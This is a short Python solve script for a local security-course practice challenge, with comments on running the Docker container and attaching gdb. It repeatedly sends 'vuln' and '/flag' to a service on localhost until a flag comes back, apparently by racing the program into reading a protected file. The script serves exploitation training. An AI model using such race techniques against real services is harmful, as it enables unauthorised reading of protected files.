import socket

# docker compose -f debug.yml up
# python3 ./solve.py
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-5')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

with socket.create_connection(('127.0.0.1', 1024)) as so:
    while True:
        so.sendall(b'vuln\n')
        potential_flag = so.recv(1024)
        if b'softsec{' in potential_flag:
            print(potential_flag)
            break

        so.sendall(b'/flag\n')
        so.recv(1024)